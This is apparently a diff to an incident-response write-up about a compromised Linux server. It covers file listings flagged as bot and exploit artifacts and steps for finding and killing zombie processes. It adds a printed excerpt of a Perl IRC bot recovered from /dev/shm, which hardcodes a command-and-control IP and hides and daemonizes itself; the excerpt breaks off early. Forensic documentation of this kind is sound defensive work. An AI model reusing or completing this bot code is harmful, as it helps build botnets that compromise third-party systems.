@@ -49,7 +49,6 @@ drwxr-xr-x 1 root ro      4096 May 10  2018 ..
 -rw-r--r-- 1 usr1 usr1       5 Apr 22 06:23 .XIMunix
 drwxr-xr-x 2 usr1 usr1    4096 Apr 19 17:45 .dba         <-- Bot
 drwxrwx--- 2 usr1 usr1    4096 Apr 27 21:42 .sysinfo     <-- Bot
--rw-r--r-- 1 usr1 usr1   20094 Apr 27 20:33 fk           <-- KillerBot
 drwxr-xr-x 2 usr1 usr1    4096 Mar 13 08:41 hsperfdata_usr1
 drwxr-xr-x 2 root root    4096 Oct  7  2016 hsperfdata_root
 -rwx------ 1 usr1 usr1  480296 Apr 27 21:42 ib_cm
@@ -61,20 +60,11 @@ drwxr-xr-x 2 root root    4096 Oct  7  2016 hsperfdata_root
 drwxr-xr-x 2 usr1 usr1    4096 Apr 27 15:18 .dba         <-- Bot
 -rw-r--r-- 1 usr1 usr1       0 Apr 29 06:38 .dbb         <-- Bot
 -rw-r--r-- 1 usr1 usr1     290 Apr 17 06:57 04dlOCl      <-- Bot
--rw-r--r-- 1 usr1 usr1     290 Apr 21 04:50 09m4JAO      <-- Bot
--rw-r--r-- 1 usr1 usr1     160 Apr 17 07:17 0B74AiN      <-- Bot
--rw-r--r-- 1 usr1 usr1     290 Apr 24 06:28 0C3GIEc      <-- Bot
--rw-r--r-- 1 usr1 usr1     160 Apr 14 22:50 1LgBCd8      <-- Bot
--rw-r--r-- 1 usr1 usr1     160 Apr 14 21:03 jEgLnBc      <-- Bot
 -rwxr-xr-x 1 usr1 usr1 1099016 Apr 29 06:38 jGcLFA1      <-- Bot
 drwxr-xr-x 2 usr1 usr1    4096 Apr 19 12:47 khugepageds  <-- Bot
 -rw-r--r-- 1 usr1 usr1     290 Apr 23 00:22 lIFa09m      <-- Bot
 -rw-r--r-- 1 usr1 usr1     160 Apr 14 11:26 lLNCeDg      <-- Bot
 -rw-r--r-- 1 usr1 usr1     290 Apr 15 00:37 lMBH5ME      <-- Bot
--rw-r--r-- 1 usr1 usr1     160 Apr 27 14:55 lalmC9B      <-- Bot
--rw-r--r-- 1 usr1 usr1     160 Apr 24 17:08 lc6hCJM      <-- Bot
--rw-r--r-- 1 usr1 usr1     160 Apr 23 03:33 lgl7kBp      <-- Bot
--rw-r--r-- 1 usr1 usr1     160 Apr 23 11:32 m3eP059      <-- Bot
 
 --- 400 lines deleted ----
 ```
@@ -105,7 +95,39 @@ drwxr-xr-x 5 root   root    340 Oct 10  2018 ..
 -rw-r--r-- 1 daemon daemon  290 Apr 14 02:03 aEEC4K5          <-- exploit 
 ```
 
-### Zombie Processes
+### Zombie processes
+
+To kill a zombie (process) you have to kill its parent process (just like real zombies!), but the question was how to find it.
+
+- Find the zombie
+
+```shell
+# ps aux | grep 'Z'
+```
+
+- What you get is Zombies and anything else with a Z in it, so you will also get the grep
+
+```
+# ps aux | grep 'Z'
+
+USER       PID     %CPU %MEM  VSZ    RSS TTY      STAT START   TIME COMMAND
+usr1       13572   0.0  0.0   7628   992 pts/2    S+   19:40   0:00 grep --color=auto Z
+usr1       93572   0.0  0.0   0      0   ??       Z    19:40   0:00 something
+```
+
+- Find the zombie's parent
+
+```shell
+# pstree -p -s 93572
+
+init(1)---cnid_metad(1311)---cnid_dbd(5145)
+```
+
+In this case you do not want to kill that parent process and you should be quite happy with one zombie, but killing the immediate parent process 5145 should get rid of it.
+
+
+#### Example
+
 ```shell
 # ps -ef
 
@@ -115,27 +137,78 @@ usr1   336     1  0 Apr19 ?        00:00:00 [kill] <defunct>
 usr1   339     1  0 Apr21 ?        00:00:00 [kill] <defunct>
 usr1   354     1  0 Apr19 ?        00:00:00 [kill] <defunct>
 usr1   361     1  0 Apr17 ?        00:00:00 [kill] <defunct>
-usr1   382     1  0 Apr19 ?        00:00:00 [kill] <defunct>
-usr1   403     1  0 Apr18 ?        00:00:00 [kill] <defunct>
-usr1   415     1  0 Apr21 ?        00:00:00 [kill] <defunct>
-usr1   427     1  0 Apr21 ?        00:00:00 [kill] <defunct>
-usr1   462     1  0 Apr22 ?        00:00:00 [kill] <defunct>
-usr1   508     1  0 Apr21 ?        00:00:00 [kill] <defunct>
-usr1   516     1  0 Apr18 ?        00:00:00 [kill] <defunct>
-usr1   529     1  0 Apr20 ?        00:00:00 [kill] <defunct>
-usr1   539     1  0 Apr20 ?        00:00:00 [kill] <defunct>
-usr1   544     1  0 Apr21 ?        00:00:00 [kill] <defunct>
-usr1   597     1  0 Apr22 ?        00:00:00 [kill] <defunct>
-usr1   599     1  0 Apr18 ?        00:00:00 [kill] <defunct>
-usr1   642     1  0 Apr21 ?        00:00:00 [kill] <defunct>
-usr1   644     1  0 Apr21 ?        00:00:00 [kill] <defunct>
-usr1   648     1  0 Apr21 ?        00:00:00 [kill] <defunct>
-usr1   663     1  0 Apr20 ?        00:00:00 [kill] <defunct>
-usr1   688     1  0 Apr20 ?        00:00:00 [kill] <defunct>
-usr1   756     1  0 Apr21 ?        00:00:00 [kill] <defunct>
 usr1   858     1  0 Apr22 ?        00:00:00 [kill] <defunct>
 usr1   903     1  0 Apr21 ?        00:00:00 [kill] <defunct>
 usr1   960     1  0 Apr20 ?        00:00:00 [kill] <defunct>
 usr1  1015     1  0 Apr17 ?        00:00:00 [sh] <defunct>
 usr1  1072     1  0 Apr20 ?        00:00:00 [kill] <defunct>
+usr1  1086     1  0 Apr21 ?        00:00:00 [kill] <defunct>
+usr1  1131     1  0 Apr20 ?        00:00:00 [kill] <defunct>
+usr1  1274     1  0 Apr20 ?        00:00:00 [kill] <defunct>
+usr1  1339     1  0 Apr21 ?        00:00:00 [sh] <defunct>
+usr1  1341     1  0 Apr19 ?        00:00:00 [kill] <defunct>
+usr1  1350     1  0 Apr21 ?        00:00:00 [sh] <defunct>
+usr1  1395     1  0 Apr21 ?        00:00:00 [sh] <defunct>
+usr1  1422     1  0 Apr21 ?        00:00:00 [sh] <defunct>
+usr1  1434     1  0 Apr21 ?        00:00:00 [sh] <defunct>
+usr1  1458     1  0 Apr21 ?        00:00:00 [kill] <defunct>
+usr1  1523     1  0 Apr21 ?        00:00:00 [sh] <defunct>
+usr1  1559     1  0 Apr21 ?        00:00:00 [sh] <defunct>
+usr1  1614     1  0 Apr21 ?        00:00:00 [kill] <defunct>
+usr1  1664     1  0 Apr21 ?        00:00:00 [sh] <defunct>
+usr1  1726     1  0 Apr20 ?        00:00:00 [sh] <defunct>
+usr1  1727     1  0 Apr20 ?        00:00:00 [sh] <defunct>
+usr1  1748     1  0 Apr17 ?        00:00:00 [kill] <defunct>
+```
+
+## Example of bot
+
+```perl
+cat /dev/shm/bt1.txt
+
+
+#!/usr/bin/perl
+my $processo =("test123");
+
+my @titi = ("index.php?page=","main.php?page=");
+
+my $goni = $titi[rand scalar @titi];
+
+my $linas_max='3';
+my $sleep='7';
+my @adms=("x", "y", "z", "w" );
+my @hostauth=("local");
+my @canais=("#3w");
+chop (my $nick = `uname`);
+my $servidor="193.56.28.207";
+my $ircname =("g");
+my $realname = ("g");
+my @ircport = ("80","143");
+my $porta = $ircport[rand scalar @ircport];
+my $VERSAO = '0.5';
+$SIG{'INT'} = 'IGNORE';
+$SIG{'HUP'} = 'IGNORE';
+$SIG{'TERM'} = 'IGNORE';
+$SIG{'CHLD'} = 'IGNORE';
+$SIG{'PS'} = 'IGNORE';
+use IO::Socket;
+use Socket;
+use IO::Select;
+chdir("/tmp");
+$0="$processo"."\0"x16;;
+my $pid=fork;
+exit if $pid;
+die "Problema com o fork: $!" unless defined($pid);
+
+our %irc_servers;
+our %DCC;
+my $dcc_sel = new IO::Select->new();
+
+$sel_cliente = IO::Select->new();
+sub sendraw {
+  if ($#_ == '1') {
+    my $socket = $_[0];
+    print $socket "$_[1]
+    
+--- others lines deleted ----
 ```
